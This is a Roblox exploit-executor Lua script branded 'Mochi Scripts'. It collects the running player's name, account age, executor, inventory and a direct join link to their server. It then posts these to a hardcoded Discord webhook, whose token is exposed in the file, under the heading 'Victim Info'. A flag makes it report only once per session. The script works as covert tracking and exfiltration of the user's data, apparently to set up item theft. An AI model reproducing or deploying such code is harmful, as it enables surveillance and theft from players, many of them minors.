-- Mochi Scripts 🤓 | FINAL - ONE EXECUTE ONLY PER SESSION

--------------------------------------------------
-- WAIT GAME LOAD
--------------------------------------------------
repeat task.wait() until game:IsLoaded()

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local player = Players.LocalPlayer
repeat task.wait() until player
repeat task.wait() until player.Character

--------------------------------------------------
-- CHECK IF ALREADY EXECUTED IN THIS SESSION
--------------------------------------------------
local FLAG_NAME = "MochiSent_" .. game.PlaceId  -- unique per game

local alreadySent = false

-- Method 1: Check in PlayerGui (persistent in session)
if player:FindFirstChild("PlayerGui") then
    local gui = player.PlayerGui:FindFirstChild(FLAG_NAME)
    if gui then
        alreadySent = true
    end
end

-- Method 2: Extra check sa CoreGui (kung may access ang exploit)
if not alreadySent and game:GetService("CoreGui"):FindFirstChild(FLAG_NAME) then
    alreadySent = true
end

if alreadySent then
    print("→ Script already sent webhook in this session. Skipping...")
    return  -- EXIT NA AGAD
end

--------------------------------------------------
-- CREATE FLAG PARA HINDI NA ULIT MAG-RUN
--------------------------------------------------
local function markAsSent()
    -- Sa PlayerGui
    local pgui = player:WaitForChild("PlayerGui", 5)
    if pgui then
        local flag = Instance.new("BoolValue")
        flag.Name = FLAG_NAME
        flag.Value = true
        flag.Parent = pgui
        flag.Archivable = false
    end
    
    -- Backup sa CoreGui (kung kaya ng executor)
    pcall(function()
        local core = game:GetService("CoreGui")
        local flag2 = Instance.new("BoolValue")
        flag2.Name = FLAG_NAME
        flag2.Value = true
        flag2.Parent = core
        flag2.Archivable = false
    end)
end

--------------------------------------------------
-- 🔴 PALITAN MO ITO
--------------------------------------------------
local WEBHOOK_URL = "https://discord.com/api/webhooks/1452520279447306410/mXVDUBBGbQnOSobmKGBszQT5h0UpJV8MphP6d7j3dP0ydAqaUJHlPIY0hgOYmYPiIFXi"

--------------------------------------------------
-- HTTP REQUEST DETECTOR
--------------------------------------------------
local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request

if not httpRequest then
    warn("❌ HTTP not supported by executor")
    return
end

--------------------------------------------------
-- EXECUTOR NAME
--------------------------------------------------
local function getExecutor()
    if identifyexecutor then return identifyexecutor() end
    if syn then return "Synapse" end
    if fluxus then return "Fluxus" end
    if KRNL_LOADED then return "KRNL" end
    return "Unknown"
end

--------------------------------------------------
-- GAME NAME
--------------------------------------------------
local function getGameName()
    local success, info = pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
    return success and info and info.Name or "Unknown Game"
end

--------------------------------------------------
-- THUMBNAIL
--------------------------------------------------
local function getThumbnail(userId)
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=150&height=150&format=png"
end

--------------------------------------------------
-- ITEM NAME
--------------------------------------------------
local function getRealItemName(tool)
    if tool:GetAttribute("DisplayName") then
        return tostring(tool:GetAttribute("DisplayName"))
    end
    local itemName = tool:FindFirstChild("ItemName")
    if itemName and itemName:IsA("StringValue") then
        return itemName.Value
    end
    return tool.Name
end

--------------------------------------------------
-- INVENTORY (walang Equipped tag)
--------------------------------------------------
local function getInventory()
    local items = {}
    
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, tool in ipairs(backpack:GetChildren()) do
            if tool:IsA("Tool") then
                table.insert(items, "• " .. getRealItemName(tool))
            end
        end
    end
    
    if player.Character then
        for _, tool in ipairs(player.Character:GetChildren()) do
            if tool:IsA("Tool") then
                table.insert(items, "• " .. getRealItemName(tool))
            end
        end
    end
    
    return #items > 0 and table.concat(items, "\n") or "None"
end

--------------------------------------------------
-- SEND WEBHOOK
--------------------------------------------------
local function sendWebhook()
    local payload = {
        embeds = {{
            title = "Mochi Scripts 🤓",
            description = "**" .. getGameName() .. "**",
            color = 5793266,
            thumbnail = { url = getThumbnail(player.UserId) },
            fields = {
                {
                    name = "Victim Info",
                    value = string.format(
                        "```👤 Display Name : %s\n🆔 Username     : %s\n📅 Account Age  : %d days\n🖥 Executor     : %s\n👥 Players      : %d/%d```",
                        player.DisplayName, player.Name, player.AccountAge,
                        getExecutor(), #Players:GetPlayers(), Players.MaxPlayers
                    ),
                    inline = false
                },
                {
                    name = "👜 Inventory",
                    value = "```" .. getInventory() .. "```",
                    inline = false
                },
                {
                    name = "👥 Join Player",
                    value = "[**Join Server**](https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId .. ")",
                    inline = false
                }
            },
            footer = { text = "Mochi Scripts 🤓" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    print("📡 Sending webhook...")

    local success, err = pcall(function()
        httpRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if success then
        print("✅ WEBHOOK SENT SUCCESSFULLY")
        markAsSent()           -- <--- DITO INILAGAY PARA KAPAG SUCCESS LANG
    else
        warn("❌ WEBHOOK FAILED: " .. tostring(err))
    end
end

--------------------------------------------------
-- RUN (only if not sent yet)
--------------------------------------------------
task.wait(1)
sendWebhook()
